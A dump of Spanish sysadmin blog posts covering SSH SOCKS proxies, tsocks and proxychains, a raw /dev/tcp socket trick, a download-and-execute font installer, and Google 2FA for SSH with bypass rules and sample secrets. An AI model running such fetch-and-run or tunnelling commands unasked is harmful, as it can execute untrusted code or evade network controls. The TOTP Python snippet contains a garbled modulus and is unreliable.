\"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/14/obteniendo-la-ip-publica-la-ip-privada-y-la-direccion-mac-en-bash/","loc":"https://karpoke.ignaciocano.com/2011/08/14/obteniendo-la-ip-publica-la-ip-privada-y-la-direccion-mac-en-bash/"},{"title":"Utilizar SSH para establecer un servidor proxy SOCKS","text":"Un proxy SOCKS es un servidor que permite el acceso, normalmente, a través de un cortafuegos. Podemos utilizar SSH para crear un proxy SOCKSv5 en local, de tal manera que si configuramos una aplicación para que se conecte a través de este proxy , todo el tráfico vaya a través del canal seguro creado por SSH, y sea como si la conexión con dicha aplicación se hiciera en la máquina remota a la cual nos hemos conectado por SSH. Además, podemos utilizarlo con varias aplicaciones y diferentes protocolos. Esto nos permitirá, por ejemplo, navegar por cualquier sitio sin las restricciones que pudiera tener la red a la cual nos hemos conectado, y sin que nadie de dicha red pueda conocer qué páginas visitamos. No se limita únicamente a navegar, también lo podemos utilizar para consultar el correo electrónico, mensajería instantánea, etc. Se puede aplicar a cualquier aplicación que pueda utilizar un proxy SOCKS. De hecho, incluso con aplicaciones que no están pensadas para utilizar este tipo de proxies . Crear el proxy SOCKS Para crear el proxy SOCKS, ejecutamos: bash $ ssh -f -N -D 1080 user@remotehost Con el argumento -f ejecutamos SSH en segundo plano. Con el argumento -N le decimos que no vamos a ejecutar ningún comando, por lo que no nos dará acceso a la consola. El argumento -D es el que crea una redirección de puertos local a nivel de aplicación. Crea un socket que escucha en el puerto especificado, en este caso el 1080, en nuestra máquina y cuando se realiza una conexión a este puerto, la conexión se redirecciona a través del canal seguro creado. Están soportadas las versiones SOCKS4 y SOCKS5. La principal diferencia entre las dos es que la versión 5 incorporando autenticación. Sólo el root puede redirigir puertos bien conocidos. Configurar las aplicaciones Una vez creado el proxy SOCKS, deberemos configurar la aplicación para que haga uso de él. Por ejemplo, para Firefox debemos ir a Editar > Preferencias > Avanzado > Red > Configuración de la conexión > Configuración manual del proxy y ponemos: bash Servidor SOCKS: localhost Puerto: 1080 tsocks , para las aplicaciones que no soportan el uso de proxies Hay aplicaciones que no están pensadas para utilizar un proxy SOCKS. En este caso, utilizaremos el comando tsocks , que permite que cualquier aplicación utilice este tipo de proxies de forma transparente. Después de instalarlo de los repositorios, debemos configurarlo editando el fichero /etc/tsocks.conf : bash server = 127.0.0.1 server_type = 5 server_port = 1080 Para conseguir que una aplicación utilice nuestro proxy SOCKS: bash $ tsocks telnet google.com 80 Trying 209.85.148.106... Connected to google.com. Escape character is '&#94;]'. &#94;C tsocks se basa en el concepto de \"shared library interceptor\" . Mediante el uso de la variable de entorno LD_PRELOAD , o del archivo /etc/ld.so.preload , tsocks se carga automáticamente en el espacio del proceso de cada programa ejecutado y sobrescribe la función connect() , de tal manera que cuando una aplicación quiere establecer una conexión TCP, en su lugar, pasa el control a tsocks , quien determina si la conexión tiene que realizarse a través de un servidor SOCKS (comprobando /etc/tsocks.conf ) y, si es así, negocia la conexión utilizando la función connect() real. Si ejecutamos tsocks sin pasarle ningún parámetro, crea una consola en la que tsocks están incluido en la variable LD_PRELOAD . También podemos incluir tsocks en la variable de entorno LD_PRELOAD de la sesión actual, eliminarlo o comprobar si ya está incluido: bash $ tsocks -on $ tsocks -off $ tsocks -show Por lo visto, las aplicaciones Java no se entienden con tsocks y requieren una configuración especial: bash $ java -DsocksProxyHost=127.0.0.1 -DsocksProxyPort=1080 MiAplicacionJava autossh , cuando el proxy se cae Podría pasar que la conexión se corte de vez en cuando. En este caso, podemos utilizar autossh : bash $ autossh -f -N -D 1080 user@remotehost SSH a través del proxy SOCKS Para conectarnos a un servidor SSH a través de otro, no es necesario que creemos un proxy SOCKS. Podemos conectarnos utilizando uno de intermediario: bash $ ssh -t remotehost ssh otherremotehost Esto se suele utilizar si, desde donde estamos, remotehost es accesible pero otherremotehost no lo es, pero éste sí es accesible desde el primero. Sin embargo, esta opción no va del todo bien si lo que queremos es utilizar scp o sftp . Podríamos utilizar tsocks para crear una conexión SSH a través del proxy SOCKS que tenemos: bash $ tsocks ssh otherremotehost Pero ssh también dispone de sus propios métodos. La opción ProxyCommand sirve para conectar a un servidor SSH a través de un proxy : bash $ ssh -o \"ProxyCommand /bin/nc.openbsd -x localhost %h %p\" user@otherremotethost También podríamos añadir la configuración de ProxyCommand a nuestro archivo ~/.ssh/config : bash Host otherremotehost ProxyCommand ssh remotehost exec nc %h %p Ahora, para conectarnos a otherremotehost se puede hacer de forma directa, sin pasarle ningún parámetro demás a ssh . Ojo, necesitamos tener instalado netcat ( nc ) en ambos casos. bash $ ssh otherremotehost Con algún que otro truco, también se puede conseguir utilizar ProxyCommand sin utilizar netcat . Se trata de utilizar el fichero especial /dev/tcp : bash ProxyCommand ssh remotehost 'exec 3<>/dev/tcp/otherremotehost/22; cat < &3 & cat >&3;kill $!' Para comprobar que esta funcionalidad está soportada , deberemos ejecutar lo siguiente en remotehost , lo que nos devolverá la página de inicio de Google: bash $ exec 3<>/dev/tcp/www.google.com/80 $ echo -e \"GET / HTTP/1.1\\n\\n\">&3 $ cat < &3 Si queremos estar seguros de que utilizamos bash , podemos poner: bash ProxyCommand ssh remotehost \"/bin/bash -c 'exec 3<>/dev/tcp/otherremotehost/22; cat < &3 & cat >&3;kill $!'\" Los ficheros /dev/tcp y /dev/udp no existen, sino que son interpretados por Bash directamente. bash $ strings /bin/bash | grep -iE \"tcp|udp\" /dev/tcp/_/_ /dev/udp/_/_ Encadenar proxies mediante proxychains Por último, podemos utilizar proxychains para encadenar varios proxies . proxychains acepta proxies SOCKS4, SOCKS4 y HTTP proxies . Los ficheros de configuración que se comprueban, en orden, son: ./proxychains.conf $HOME/.proxychains/proxychains.conf /etc/proxychains.conf Lo más sencillo es editar el fichero /etc/proxychains.conf . Algunos ejemplos de configuración: bash socks5 192.168.67.78 1080 lamer secret http 192.168.89.3 8080 justu hidden socks4 192.168.1.49 1080 http 192.168.39.93 8080 En nuestro caso, tendríamos únicamente el proxy SOCKS que hemos creado nosotros: bash socks5 127.0.0.1 1080 Para ejecutarlo, es similar a tsocks : bash $ proxychains telnet google.com 80 ProxyChains-3.1 (http://proxychains.sf.net) |DNS-request| google.com |S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<><>-OK |DNS-response| google.com is 209.85.148.106 Trying 209.85.148.106... |S-chain|-<>-127.0.0.1:1080-<><>-209.85.148.106:80-<><>-OK Connected to google.com. Escape character is '&#94;]'. &#94;C","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/12/utilizar-ssh-para-establecer-un-servidor-proxy-socks/","loc":"https://karpoke.ignaciocano.com/2011/08/12/utilizar-ssh-para-establecer-un-servidor-proxy-socks/"},{"title":"Instalación automática de las fuentes para web de Google","text":"En webupd8.org han publicado un script que permite descargar las fuentes para web de Google , o actualizarlas si ya las habíamos descargado. Google Web Fonts es un proyecto que consiste en crear un repositorio de fuentes tipográficas de calidad, libres y gratuitas, para que cualquiera pueda utilizarlas en sus proyectos web, sin ningún tipo de barrera, mucho menos económica. Fuente: googlewebfonts.blogspot.com El script instala las fuentes en el directorio /usr/share/fonts/truetype/google-fonts/ , por lo que basta eliminar este directorio para borrarlas. Para descargar el script e instalar las fuentes, ejecutamos: bash $ wget http://webupd8.googlecode.com/files/install-google-fonts $ chmod +x install-google-fonts $ ./install-google-fonts Éste es el contenido del script : ```bash Original author: Michalis Georgiou Modified by Andrew http://www.webupd8.org sudo apt-get install mercurial _hgroot=\"https://googlefontdirectory.googlecode.com/hg/\" _hgrepo=\"googlefontdirectory\" echo \"Connecting to Mercurial server....\" if [ -d \\(_hgrepo ] ; then cd $_hgrepo hg pull -u || return 1 echo \"The local files have been updated.\" cd .. else hg clone $_hgroot $_hgrepo || return 1 fi echo \"Mercurial checkout done or server timeout\" sudo mkdir -p /usr/share/fonts/truetype/google-fonts/ find $PWD/\\) _hgrepo/ -name \"*.ttf\" -exec sudo install -m644 {} /usr/share/fonts/truetype/google-fonts/ \\; || return 1 fc-cache -f > /dev/null echo \"done.\" ``` El script también crea el directorio googlefontdirectory en el directorio desde el cual lo hayamos lanzado. Ahí se encuentra el respositorio de las fuentes , así la próxima vez que lo ejecutemos se realizará una actualización, en lugar de una descarga completa. Una cosa que hace el script y que no he visto comentada en la página del repositorio, es ejecutar el comando fc-cache después de realizar la instalación o actualización de las fuentes. fc-cache busca en el directorio de fuentes del sistema, /usr/share/fonts/ , y crea diversos archivos caché con información de las fuentes para las aplicaciones que usan fontconfig para el tratamiento de las fuentes. Estos archivos caché se utilizan para acelerar el inicio de la aplicación cuando utilizan la librería fontconfig . fontconfig es una biblioteca de configuración y personalización de tipografías, que no depende del sistema de ventanas X. Está diseñada para localizar tipografías en el sistema y seleccionarlas según los requerimientos especificados por las aplicaciones. Para utilizar las fuentes, vamos al menú Sistema > Preferencias > Apariencia > Tipografías . if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"dev","url":"https://karpoke.ignaciocano.com/2011/08/07/instalacion-automatica-de-las-fuentes-para-web-de-google/","loc":"https://karpoke.ignaciocano.com/2011/08/07/instalacion-automatica-de-las-fuentes-para-web-de-google/"},{"title":"Servicio de SSH con sistema de verificación en dos pasos de Google en Ubuntu Natty Narwhal","text":"Un sistema de verificación en dos pasos, ( Two Factor Authentication o 2FA) consiste en que la autenticación a un servicio se realiza mediante dos piezas de información, una que conocemos y otra que no. La pieza que conocemos es nuestra contraseña, que es susceptible de ser sustraída, mientras que la información que no conocemos es un número de identificación (PIN) aleatorio que cambia cada 30 segundos y que está vinculado con un dispositivo hardware. Esto es lo que se conoce como una contraseña de un solo uso (One Time Password u OTP). De esta forma, aunque alguien nos robe o averigüe nuestra contraseña, a no ser que también tenga acceso al dispositivo que crea los PINs, no podrá acceder al servicio con nuestra cuenta. Hay que tener en cuenta que, dado que el PIN es de 6 dígitos, si alguien pudiera probar 1000000 (un millón) de contraseñas en 30 segundos encontraría la clave, por lo que es necesario añadir algún mecanismo extra que impida el acceso por fuerza bruta al sistema. Cuando Google introdujo 2FA en sus aplicaciones, también creó un módulo PAM para GNU/Linux y una aplicación para el móvil que convierte nuestro móvil en el dispositivo generador de PINs. Actualizado el 18 de marzo de 2015 Como alternativa a la aplicación móvil de Google (código disponible en github ), podemos usar FreeOTP , una aplicación también libre para Android e iOS, compatible con HOTP y TOTP , que servirá perfectamente para nuestro propósito. Fuente: google.com Antes de comenzar, es necesario remarcar que este sistema es incompatible con el uso exclusivo de claves para conectarnos por SSH ; se debe poder acceder introduciendo usuario y contraseña. Requisitos previos Para habilitar 2FA en nuestro servidor , necesitamos descargar, compilar e instalar el módulo PAM en nuestra máquina. Instalación Instalamos, previamente, los paquetes necesarios: bash $ sudo aptitude install libpam0g-dev libpam-devperm mercurial Descargamos el módulo PAM: bash $ hg clone https://code.google.com/p/google-authenticator/ Realizando la instalación en una Ubuntu Lucid Lynx (10.04) me aparecía el siguiente error: bash abort: repository [svn]https://zxing.googlecode.com/svn/trunk/ not found! Parece ser que es porque tiene una versión de mercurial un poco vieja . bash $ hg --version Mercurial Distributed SCM (version 1.4.3) Deberemos instalar una versión de mercurial más nueva de la que está en los repositorios de Lucid, o descargar el código en otro sitio y copiarlo. Con la versión de mercurial en Ubuntu Natty Narwhal no tuve problemas: bash $ hg --version Mercurial Distributed SCM (version 1.7.5) Si lo hemos bajado en otra máquina, no hace falta que copiemos el repositorio entero, únicamente el directorio libpam : bash user@otherhost:~$ scp -r google-authentication/libpam/ user@host:~ Una vez hecho este paso, lo compilamos en la máquina que lo queremos instalar, y lo instalamos: bash $ cd libpam/ $ make Como inciso, comentar que, ya que estaba, también lo iba a instalar en una Ubuntu Natty Narwhal, y me dio el siguiente error: bash google-authenticator.o: In function `displayQRCode': /home/karpoke/hg-read-only/google-authenticator/libpam/google-authenticator.c:154: undefined reference to `dlopen' /home/karpoke/hg-read-only/google-authenticator/libpam/google-authenticator.c:166: undefined reference to `dlsym' /home/karpoke/hg-read-only/google-authenticator/libpam/google-authenticator.c:168: undefined reference to `dlsym' /home/karpoke/hg-read-only/google-authenticator/libpam/google-authenticator.c:253: undefined reference to `dlclose' /home/karpoke/hg-read-only/google-authenticator/libpam/google-authenticator.c:156: undefined reference to `dlopen' El problema parece ser que el Makefile no encuentra la librería libdl —la busca en /usr/lib/libdl.so —. La solución pasa por buscarla nosotros mismos y modificar dicho fichero: bash $ find /usr/lib -name libdl.so /usr/lib/i386-linux-gnu/libdl.so $ sed -i 's|/usr/lib/libdl.so|/usr/lib/i386-linux-gnu/libdl.so|g' Makefile $ make Lo instalamos, por fin: bash $ sudo make install $ cp pam_google_authenticator.so /lib/security $ cp google-authenticator /usr/local/bin Configurar el servicio de SSH Ahora debemos añadir el módulo recién instalado al final del fichero /etc/pam.d/sshd &#94; 1 &#94;: ```bash Google 2FA auth required pam_google_authenticator.so ``` Ejecutamos el siguiente comando con cada usuario con el que queremos utilizar el 2FA, lo cual nos creará una clave secreta en el directorio de usuario: ```bash $ google-authenticator https://www.google.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth://totp/user@server%3Fsecret%3DSAEP64T5VZAVWAFB Your new secret key is: SAEP64T5VZAVWAFB Your verification code is 376046 Your emergency scratch codes are: 67868696 26247332 54815527 54336661 71083816 Do you want me to update your \"~/.google_authenticator\" file (y/n) y Do you want to disallow multiple uses of the same authentication token? This restricts you to one login about every 30s, but it increases your chances to notice or even prevent man-in-the-middle attacks (y/n) y By default, tokens are good for 30 seconds and in order to compensate for possible time-skew between the client and the server, we allow an extra token before and after the current time. If you experience problems with poor time synchronization, you can increase the window from its default size of 1:30min to about 4min. Do you want to do so (y/n) n If the computer that you are logging into isn't hardened against brute-force login attempts, you can enable rate-limiting for the authentication module. By default, this limits attackers to no more than 3 login attempts every 30s. Do you want to enable rate-limiting (y/n) y ``` Deberemos guardar esos códigos celosamente, ya que si perdemos el móvil, esa será la única manera de poder iniciar sesión de forma remota. Lo siguiente es abrir en un navegador la URL que nos aparece al principio y nos aparecerá un QRCode. Utilizamos la aplicación Google Authenticator para nuestro móvil y lo escaneamos. Si ya teníamos otro generador, ahora tendremos los dos y los podremos distinguir por el nombre. También podemos leer el código desde el terminal para ver lo que contiene : bash $ wget -O qrcode.png 'https://www.google.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth://totp/user@server%3Fsecret%3DSAEP64T5VZAVWAFB' $ qrdecode qrcode.png otpauth://totp/user@server?secret=SAEP64T5VZAVWAFB Es importante que el servidor tenga instalado un servicio de NTP para actualizar la hora de forma precisa. Si tenemos problemas con esto, deberíamos permitir un tamaño de ventana más abierto, tal como sugería google-authenticator . También necesitaremos editar el fichero de configuración de ssh , /etc/ssh/sshd_config , para que contenga: bash ChallengeResponseAuthentication yes UsePAM yes Si usamos las directivas AllowUsers o AllowGroups debemos acordarnos de incluir a cada usuario. Reiniciamos el servicio de SSH pero no cerramos la conexión que tenemos abierta, sino que intentaremos conectarnos iniciando otra sesión nueva. El motivo es que si tuviéramos algún problema, nos quedaríamos sin poder acceder a la máquina. Si tenemos las conexiones por SSH compartidas , no bastará con abrir un nuevo terminal, deberemos conectarnos desde otro usuario o en otra máquina. bash $ ssh user@host Password: Verification code: La contraseña es la misma que teníamos y el código de verificación es el que nos aparezca en el móvil. Listos. Configurar un sistema de verificación en dos pasos para SSH es así de sencillo. Por un lado, gracias a Google y por otro, gracias a tutoriales como el de TechRepublic . Omitiendo 2FA Podemos tener diferentes razones para no querer utilizar este tipo de autenticación en algunos casos. Por ejemplo, permitir la conexión desde la propia red o permitir que algunos usuarios no utilicen este sistema. Omitiendo 2FA para accesos desde la red interna Si sólo queremos 2FA para accesos remotos, desde fuera de la red local, y preferimos omitirlo en conexiones desde la misma LAN , deberemos hacer lo siguiente. Creamos el fichero /etc/security/access-local.conf y ponemos: bash + : ALL : 192.168.50.0/24 + : ALL : LOCAL - : ALL : ALL Modificamos el fichero /etc/pam.d/sshd para añadir la siguiente línea justo antes de la que ya habíamos añadido, quedando así: bash auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf auth required pam_google_authenticator.so Ahora ya podemos reiniciar el servicio SSH , y para las conexiones locales o desde la red 192.168.50.0/24 bastará con proporcionar la contraseña. Omitiendo 2FA para un usuario concreto Para evitar que determinados usuarios usen este sistema de autenticación, podemos incluir una línea como la siguiente, al principio del fichero /etc/security/access-local.conf , quedando así: bash + : username : ALL + : ALL : 192.168.50.0/24 + : ALL : LOCAL - : ALL : ALL Deberemos reiniciar el servicio SSH para que los cambios tengan efecto. Omitiendo 2FA para un grupo concreto En lugar de ir añadiendo usuarios al fichero /etc/security/access-local.conf , podemos incluir una nueva regla al fichero /etc/pam.d/sshd , justo antes de los cambios que habíamos acabado de añadir en este fichero, quedando así: bash auth sufficient pam_succeed_if.so user ingroup nonotp auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf auth required pam_google_authenticator.so Los usuarios que pertenezcan al grupo nonotp no utilizarán este tipo de autenticación. Deberemos reiniciar el servicio SSH para que los cambios tengan efecto. pam_succeed_if.so pam_succeed_if.so se emplea para provocar que la autenticación falle o sea exitosa en función de algunas características del usuario que está siendo autenticado. Se pueden realizar comprobaciones con los campos: user , uid , gid , shell , home y service . También se puede comprobar la pertenencia, o no, de un usuario a un grupo. Actualizado el 7 de abril de 2012 La clave de un solo uso que se genera en un momento dado depende únicamente de la clave secreta inicial del usuario y del instante en que se genera dicha clave de un sólo uso. Google Authenticator se basa en el RFC 4226 (Time based One Time Password) para generar una semilla inicial de 16 dígitos en base 32 (RFC 4648). En la página anterior se enlaza a una clase en PHP creada por el autor que muestra como se puede crear la clave para un momento dado y comprobar si una clave dada es correcta permitiendo un pequeño desfase entre los relojes de referencia. En este enlace se muestra una implementación en Python , cuyo código se puede descargar de GitHub. El proceso de obtención de una clave es el siguiente: convertir la cadena con la clave a binario convertir la cadena con el time stamp asociado al intervalo a binario calcular el hash HMAC del time stamp (la parte entera tras divirlo entre el tiempo del intervalo, 30 segundos) usando la clave. Nos devolverá un hash SHA1 de 20 bytes en el último byte del hash devuelto se especifica el offset a partir del cual se encuentra la contraseña OTP obtenemos los bytes donde se encuentra la contraseña y los convertimos a un entero módulo 1000000 En Python: ```python def get_hotp_token(secret, intervals_no): key = base64.b32decode(secret) msg = struct.pack(\">Q\", intervals_no) h = hmac.new(key, msg, hashlib.sha1).digest() o = ord(h[19]) & 15 h = (struct.unpack(\">I\", h[o:o+4])[0] & 0x7fffffff) % 1000000492246 return h def get_totp_token(secret): return get_hotp_token(secret, intervals_no=int(time.time())//30) print get_totp_token('SAEP64T5VZAVWAFB') 492246 ``` Un ejemplo de uso del módulo: bash $ git clone https://github.com/tadeck/onetimepass $ ipython In [1]: import onetimepass as otp In [2]: my_secret = 'SAEP64T5VZAVWAFB' In [3]: otp.get_totp(my_secret) Out[3]: 453001 In [4]: otp.valid_totp(453001, my_secret) Out[4]: True Actualizado el 1 de marzo de 2015 Desde Ubuntu Precise Pangolin 12.04, el paquete libpam-google-authenticator ya se encuentra en los repositorios. 1 Incluso podríamos hacer lo mismo para /etc/pam.d/gdm y utilizar 2FA para iniciar sesión en Gnome.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/05/servicio-de-ssh-con-sistema-de-verificacion-en-dos-pasos-de-google-en-ubuntu-natty-narwhal/","loc":"https://karpoke.ignaciocano.com/2011/08/05/servicio-de-ssh-con-sistema-de-verificacion-en-dos-pasos-de-google-en-ubuntu-natty-narwhal/"},{"title":"sudo vacilón","text":"bash $ sudo passwd [sudo] password for user: Are you on drugs? [sudo] password for user: Maybe if you used more than just two fingers... [sudo] password for user: I've seen penguins that can type better than that. sudo: 3 incorrect password attempts Si te gustaría recibir un piropo cada vez que escribes mal la contraseña de sudo , no tienes más que editar el archivo de configuración de sudo , /etc/sudoers , mediante el comando visudo : bash $ sudo visudo Y añadir la opción insults : bash Defaults env_reset,insults","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/04/sudo-vacilon/","loc":"https://karpoke.ignaciocano.com/2011/08/04/sudo-vacilon/"},{"title":"namebench, benchmarking de servidores DNS","text":"Mediante namebench se puede comprobar la velocidad de nuestros DNSs y compararla con los servidores DNS de Google y los mejores servidores DNS que pueda encontrar para nuestra localización. Para realizar las pruebas, se utiliza un listado compuesto por los dominios más visitados según el ranking de Alexa y las páginas visitadas que se encuentren en el historial de nuestro navegador, incluyendo a Firefox o Chromium. Tiene la opción de poder utilizarse desde el terminal . Lo descargarmos, instalamos y ejecutamos, en este caso, en un entorno gráfico: bash $ wget https://namebench.googlecode.com/files/namebench-1.3.1-source.tgz $ tar xvzf namebench-1.3.1-source.tgz $ namebench-1.3.1/namebench.py Para ejecutarlo desde el terminal, debemos pasarle el argumento -x . Además, vamos a utilizar el listado de servidores DNS de la página adslayuda.com : bash $ namebench-1.3.1/namebench.py -x $(w3m -dump http://www.adslayuda.com/dns.html | grep -Eo '([0-9]{1,3}\\.){3}[0-9]' | sort -t. -nk1 -nk2 -nk3 -nk4 | tr '\\n' ' ') Esta es la lista final con la que se realizará el benchmarking : ```bash Final list of nameservers considered: 192.168.5.1 Internal 192-5-1 39 ms | twitter.com appears incorrect: 199.59.149.198, static.ak.fbcdn.net appears incorrect: 62.208.24.72 62.151.2.8 Ya.com ES 60 ms | twitter.com appears incorrect: 199.59.148.10, 199.59.149.198, 199.59.149.230, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34 212.36.64.16 ADAM ES 61 ms | twitter.com appears incorrect: 199.59.148.10, 199.59.149.198, 199.59.149.230, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34 213.172.33.35 NeoSky-2 ES 63 ms | twitter.com appears incorrect: 199.59.149.230, 199.59.149.198, 199.59.148.82, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34 80.58.0.33 SYS-80.58.0.33 64 ms | www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34, twitter.com appears incorrect: 199.59.149.198, 199.59.148.10, 199.59.149.230 8.8.4.4 Google Public DNS- 68 ms | Replica of Google Public DNS [8.8.8.8], www.facebook.com appears incorrect: 69.171.228.11, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34, twitter.com appears incorrect: 199.59.149.198, 199.59.148.82, 199.59.149.230 208.67.222.222 OpenDNS-2 71 ms | twitter.com appears incorrect: 199.59.149.230, 199.59.149.198, 199.59.148.82, www.facebook.com appears incorrect: 69.171.229.16, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34 156.154.70.1 UltraDNS 80 ms | twitter.com appears incorrect: 199.59.149.198, 199.59.148.10, 199.59.148.82, NXDOMAIN Hijacking, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34 216.146.36.36 DynGuide-2 90 ms | www.facebook.com appears incorrect: 69.171.242.13, NXDOMAIN Hijacking, twitter.com appears incorrect: 199.59.149.230, 199.59.148.82, 199.59.148.10, www.paypal.com is hijacked: 173.0.88.34, 173.0.84.2, 173.0.84.34, 173.0.88.2 195.5.64.2 landsraad ES 96 ms | twitter.com appears incorrect: 199.59.149.230, 199.59.148.82, 199.59.149.198, www.paypal.com is hijacked: 173.0.84.2, 173.0.84.34, 173.0.88.2, 173.0.88.34 195.5.64.6 195.5.64.6 98 ms | twitter.com appears incorrect: 199.59.148.82, 199.59.149.198, 199.59.149.230, www.paypal.com is hijacked: 173.0.88.2, 173.0.88.34, 173.0.84.2, 173.0.84.34 ``` El tiempo de respuesta más rápido: ```bash Fastest individual response (in milliseconds): Internal 192-5-1 ## 1.75309 Adam-2 ES ############################# 44.50703 landsraad ES ################################### 53.90787 Telefonica Movis #################################### 55.42493 Ya.com ES ##################################### 56.76293 SYS-80.58.0.33 ##################################### 56.80299 195.5.64.6 ########################################## 64.96215 Google Public DN ############################################ 67.76404 UltraDNS ############################################## 70.23096 OpenDNS-2 ############################################## 70.60385 DynGuide-2 ##################################################### 82.16095 ``` El tiempo medio de respuesta: ```bash Mean response (in milliseconds): Internal 192-5-1 ############### 59.90 Ya.com ES ###################### 91.22 Google Public DN ######################### 102.36 UltraDNS ############################## 122.45 DynGuide-2 ################################ 131.89 OpenDNS-2 ################################ 133.27 SYS-80.58.0.33 ###################################### 155.00 Adam-2 ES ###################################### 157.71 Telefonica Movis ####################################### 159.40 landsraad ES ######################################## 164.57 195.5.64.6 ###################################################### 221.42 ``` Este el gráfico mostrado utilizando la API de Google: Recomendación final: ```bash Recommended configuration (fastest + nearest): nameserver 192.168.5.1 # Internal 192-5-1 nameserver 212.36.64.17 # Adam-2 ES nameserver 212.73.32.3 # Vodafone/Airtel ES ```","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/01/namebench-benchmarking-de-servidores-dns/","loc":"https://karpoke.ignaciocano.com/2011/08/01/namebench-benchmarking-de-servidores-dns/"},{"title":"Limitando el número de procesos por usuario","text":"Mediante el comando ulimit podemos consultar y controlar el valor de los recursos disponibles para la consola y los procesos que puedan ser iniciados desde ella . Las diferentes opciones que acepta este comando son: bash -a All current limits are reported -b The maximum socket buffer size -c The maximum size of core files created -d The maximum size of a process's data segment -e The maximum scheduling priority (\"nice\") -f The maximum size of files written by the shell and its children -i The maximum number of pending signals -l The maximum size that may be locked into memory -m The maximum resident set size (many systems do not honor this limit) -n The maximum number of open file descriptors (most systems do not allow this value to be set) -p The pipe size in 512-byte blocks (this may not be set) -q The maximum number of bytes in POSIX message queues -r The maximum real-time scheduling priority -s The maximum stack size -t The maximum amount of cpu time in seconds -u The maximum number of processes available to a single user -v The maximum amount of virtual memory available to the shell and, on some systems, to its children -x The maximum number of file locks -T The maximum number of threads Para consultar todos los valores asignados actualmente: bash $ ulimit -a core file size (blocks, -c) 0 data seg size (kbytes, -d) unlimited scheduling priority (-e) 20 file size (blocks, -f) unlimited pending signals (-i) 16382 max locked memory (kbytes, -l) 64 max memory size (kbytes, -m) unlimited open files (-n) 1024 pipe size (512 bytes, -p) 8 POSIX message queues (bytes, -q) 819200 real-time priority (-r) 0 stack size (kbytes, -s) 8192 cpu time (seconds, 